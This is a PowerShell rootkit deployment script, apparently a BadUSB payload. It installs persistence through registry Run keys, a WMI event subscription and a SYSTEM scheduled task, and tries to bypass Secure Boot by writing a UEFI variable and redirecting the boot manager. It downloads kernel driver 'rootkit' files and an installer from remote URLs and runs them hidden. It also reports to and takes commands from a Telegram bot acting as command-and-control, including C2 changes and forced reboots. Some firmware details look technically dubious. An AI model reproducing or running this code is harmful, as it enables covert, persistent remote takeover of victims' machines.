param(
    [string]$Token = "BOT_TOKEN",
    [string]$ChatId = "CHAT_ID",
    [string]$Rootkit32Url = "https://raw.githubusercontent.com/Sashka220/Bad_usb_secboot_bypass/main/Client32.sys",
    [string]$Rootkit64Url = "https://raw.githubusercontent.com/Sashka220/Bad_usb_secboot_bypass/main/Client64.sys",
    [string]$InstallerUrl = "https://raw.githubusercontent.com/Sashka220/Bad_usb_secboot_bypass/main/InstallClient.bat",
    [string]$Rootkit32Path = "$env:TEMP\Client32.sys",
    [string]$Rootkit64Path = "$env:TEMP\Client64.sys",
    [string]$InstallerPath = "$env:TEMP\InstallClient.bat"
)

function Send-TelegramLog {
    param([string]$Message)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/sendMessage" -Method Post -Body @{
            chat_id = $ChatId
            text = "[Rootkit Deployment] $Message"
        } | Out-Null
    } catch {}
}

function Add-Persistence {
    try {
        $ScriptPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        $ScriptArgs = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSScriptRoot\secure_boot_bypass.ps1`""
        
        reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecureBootBypass" /t REG_SZ /d "$ScriptPath $ScriptArgs" /f
        reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "SecureBootBypass" /t REG_SZ /d "$ScriptPath $ScriptArgs" /f
        
        reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecureBootBypass" /t REG_SZ /d "$ScriptPath $ScriptArgs" /f
        reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "SecureBootBypass" /t REG_SZ /d "$ScriptPath $ScriptArgs" /f
        
        $WmiFilter = @"
SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120
"@
        
        $WmiConsumer = @"
cmd.exe /c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "$PSScriptRoot\secure_boot_bypass.ps1"
"@
        
        Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='SecureBootBypassFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query=$WmiFilter}
        Set-WmiInstance -Namespace root\subscription -Class __EventConsumer -Arguments @{Name='SecureBootBypassConsumer'; CommandLineTemplate=$WmiConsumer}
        
        $TaskAction = New-ScheduledTaskAction -Execute $ScriptPath -Argument $ScriptArgs
        $TaskTrigger = New-ScheduledTaskTrigger -AtStartup
        $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        
        Register-ScheduledTask -TaskName "WindowsSecureBootService" -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Principal $TaskPrincipal -Force
        
        Send-TelegramLog "Persistence mechanisms installed successfully"
        return $true
    } catch {
        Send-TelegramLog "Persistence installation failed: $($_.Exception.Message)"
        return $false
    }
}

function Get-Security2Address {
    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class UefiHelper {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
"@
        
        $ntdllHandle = [UefiHelper]::GetModuleHandle("ntdll.dll")
        if ($ntdllHandle -eq [IntPtr]::Zero) {
            return $null
        }
        
        return [IntPtr]::Add($ntdllHandle, 0x187000)
    } catch {
        return $null
    }
}

function Set-UefiVariable {
    param(
        [string]$VariableName,
        [byte[]]$Data,
        [string]$Guid = "{92E59835-5F42-4E0B-9A84-47C7810EA806}"
    )
    
    try {
        $firmware = Get-WmiObject -Namespace root\wmi -Class BIOSFunction | Where-Object {$_.Name -eq "SetFirmwareEnvironmentVariable"}
        if ($firmware) {
            $result = $firmware.SetFirmwareEnvironmentVariable($VariableName, $Guid, $Data)
            return $result.ReturnValue -eq 0
        }
        
        $kernel32 = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool SetFirmwareEnvironmentVariableEx(
    string lpName, 
    string lpGuid, 
    byte[] lpValue, 
    uint nSize, 
    uint dwAttributes);
"@ -Name "Kernel32" -Namespace "Win32" -PassThru
        
        return $kernel32::SetFirmwareEnvironmentVariableEx(
            $VariableName, 
            $Guid, 
            $Data, 
            $Data.Length, 
            0x00000001)
    } catch {
        return $false
    }
}

function Invoke-SecureBootBypass {
    Send-TelegramLog "Starting Secure Boot bypass procedure"
    
    try {
        $secureBootStatus = Confirm-SecureBootUEFI
        if (-not $secureBootStatus) {
            Send-TelegramLog "Secure Boot is already disabled or not present"
            return $true
        }
        Send-TelegramLog "Secure Boot is enabled, proceeding with bypass"
    } catch {
        Send-TelegramLog "Secure Boot check failed: $($_.Exception.Message)"
        return $false
    }
    
    $gSecurity2Addr = Get-Security2Address
    if ($gSecurity2Addr -eq $null) {
        Send-TelegramLog "Failed to locate gSecurity2 address"
        return $false
    }
    
    Send-TelegramLog "Located gSecurity2 at address: $($gSecurity2Addr.ToString('X16'))"
    
    $targetAddr = [Int64]$gSecurity2Addr - 0x18
    $targetBytes = [BitConverter]::GetBytes($targetAddr)
    
    Send-TelegramLog "Target write address: $($targetAddr.ToString('X16'))"
    
    $result = Set-UefiVariable -VariableName "IhisiParamBuffer" -Data $targetBytes
    if (-not $result) {
        Send-TelegramLog "Failed to set IhisiParamBuffer variable"
        return $false
    }
    
    Send-TelegramLog "Successfully set IhisiParamBuffer variable"
    
    try {
        $vulnerableModule = "$env:TEMP\Dtbios-efi64-71.22.efi"
        
        bcdedit /set "{bootmgr}" path "$vulnerableModule"
        
        Send-TelegramLog "Vulnerable module deployed and scheduled for execution"
        return $true
    } catch {
        Send-TelegramLog "Module deployment failed: $($_.Exception.Message)"
        return $false
    }
}

function Download-RootkitFiles {
    try {
        Send-TelegramLog "Downloading rootkit components..."
        
        $architecture = (Get-WmiObject Win32_Processor).AddressWidth
        if ($architecture -eq 64) {
            Invoke-WebRequest -Uri $Rootkit64Url -OutFile $Rootkit64Path
            Send-TelegramLog "64-bit rootkit downloaded successfully"
        } else {
            Invoke-WebRequest -Uri $Rootkit32Url -OutFile $Rootkit32Path
            Send-TelegramLog "32-bit rootkit downloaded successfully"
        }
        
        Invoke-WebRequest -Uri $InstallerUrl -OutFile $InstallerPath
        Send-TelegramLog "Installer script downloaded successfully"
        
        return $true
    } catch {
        Send-TelegramLog "Download failed: $($_.Exception.Message)"
        return $false
    }
}

function Update-InstallerConfig {
    try {
        $InstallerContent = Get-Content $InstallerPath -Raw
        
        $currentConfig = [regex]::Match($InstallerContent, 'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WBDC" /v Description /t REG_SZ /d "([^"]+)" /f').Groups[1].Value
        
        Send-TelegramLog "Current C2 configuration: $currentConfig"
        Send-TelegramLog "Use /updatec2 IP:PORT to change C2 server"
        
        return $true
    } catch {
        Send-TelegramLog "Config update check failed: $($_.Exception.Message)"
        return $false
    }
}

function Update-C2Config {
    param([string]$NewConfig)
    
    try {
        $InstallerContent = Get-Content $InstallerPath -Raw
        $UpdatedContent = $InstallerContent -replace 'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WBDC" /v Description /t REG_SZ /d "([^"]+)" /f', "reg add `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WBDC`" /v Description /t REG_SZ /d `"$NewConfig`" /f"
        
        Set-Content -Path $InstallerPath -Value $UpdatedContent -Force
        Send-TelegramLog "C2 configuration updated to: $NewConfig"
        return $true
    } catch {
        Send-TelegramLog "C2 config update failed: $($_.Exception.Message)"
        return $false
    }
}

function Install-Rootkit {
    try {
        Send-TelegramLog "Installing rootkit driver..."
        
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$InstallerPath`"" -Wait -WindowStyle Hidden
        
        Send-TelegramLog "Rootkit installation completed"
        return $true
    } catch {
        Send-TelegramLog "Rootkit installation failed: $($_.Exception.Message)"
        return $false
    }
}

function Start-CommandListener {
    while ($true) {
        try {
            $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?timeout=30" -Method Get -ErrorAction SilentlyContinue
            
            foreach ($update in $updates.result) {
                if ($update.message.text) {
                    $command = $update.message.text
                    
                    switch -wildcard ($command) {
                        "/status" {
                            $systemInfo = Get-WmiObject Win32_ComputerSystem | Select-Object Name, Manufacturer, Model
                            Send-TelegramLog "System Status: ONLINE`n$($systemInfo.Name) | $($systemInfo.Model)"
                        }
                        "/info" {
                            $os = (Get-WmiObject Win32_OperatingSystem).Caption
                            $cpu = (Get-WmiObject Win32_Processor).Name
                            $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)
                            Send-TelegramLog "System Info:`nOS: $os`nCPU: $cpu`nRAM: $ram GB"
                        }
                        "/updatec2 *" {
                            $newConfig = $command -replace "/updatec2 ", ""
                            if ($newConfig -match "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$") {
                                Update-C2Config -NewConfig $newConfig
                                Install-Rootkit
                            } else {
                                Send-TelegramLog "Invalid C2 format. Use: IP:PORT"
                            }
                        }
                        "/deploy" {
                            Send-TelegramLog "Starting deployment sequence..."
                            Download-RootkitFiles
                            Update-InstallerConfig
                            Install-Rootkit
                        }
                        "/reboot" {
                            Send-TelegramLog "Initiating system reboot..."
                            Start-Process "shutdown" -ArgumentList "/f", "/r", "/t", "0" -Wait
                        }
                        default {
                            if ($command -ne $null -and $command -ne "") {
                                Send-TelegramLog "Unknown command: $command"
                            }
                        }
                    }
                }
            }
        } catch {
            # Continue listening even on errors
        }
        Start-Sleep 5
    }
}

try {
    Send-TelegramLog "Rootkit deployment script started"
    
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Send-TelegramLog "ERROR: Administrator privileges required"
        exit 1
    }
    
    Send-TelegramLog "Running with administrator privileges"
    
    Add-Persistence
    
    $bypassResult = Invoke-SecureBootBypass
    
    if ($bypassResult) {
        Send-TelegramLog "Secure Boot bypass completed successfully"
    } else {
        Send-TelegramLog "Secure Boot bypass failed, continuing with rootkit deployment"
    }
    
    $downloadResult = Download-RootkitFiles
    $updateResult = Update-InstallerConfig
    
    if ($downloadResult -and $updateResult) {
        $installResult = Install-Rootkit
        if ($installResult) {
            Send-TelegramLog "Rootkit deployment sequence completed successfully"
        }
    }
    
    Send-TelegramLog "Starting command listener..."
    Start-CommandListener
    
} catch {
    Send-TelegramLog "Critical error in deployment procedure: $($_.Exception.Message)"
}